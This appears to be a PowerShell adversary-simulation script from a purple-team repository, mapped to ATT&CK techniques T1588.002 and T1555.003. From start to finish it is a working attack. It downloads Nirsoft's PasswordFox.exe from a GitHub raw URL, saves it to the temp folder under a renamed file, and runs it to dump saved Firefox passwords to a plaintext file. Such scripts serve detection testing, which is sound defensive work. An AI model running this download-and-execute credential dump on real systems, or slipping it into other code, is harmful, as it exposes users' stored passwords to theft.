<#
    T1588.002 - Obtain Capabilities: Tool
    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    Extract passwords from Firefox browser with Nirsoft tool PasswordFox.exe
    Download PasswordFox.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PasswordFox.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
# Download and execute PasswordFox.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PasswordFox.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PasswordFox_x64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of PasswordFox.exe..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PasswordFox.exe"
}

$dumpfile = "$env:tmp\firefoxpasswords.txt"
$outfile = "$env:tmp\firefoxpass.exe"
try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: PasswordFox.exe downloaded to $outfile"
        & $outfile /stext $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download PasswordFox.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Firefox passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Firefox passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "Erorr: $_"
}

Stop-Transcript
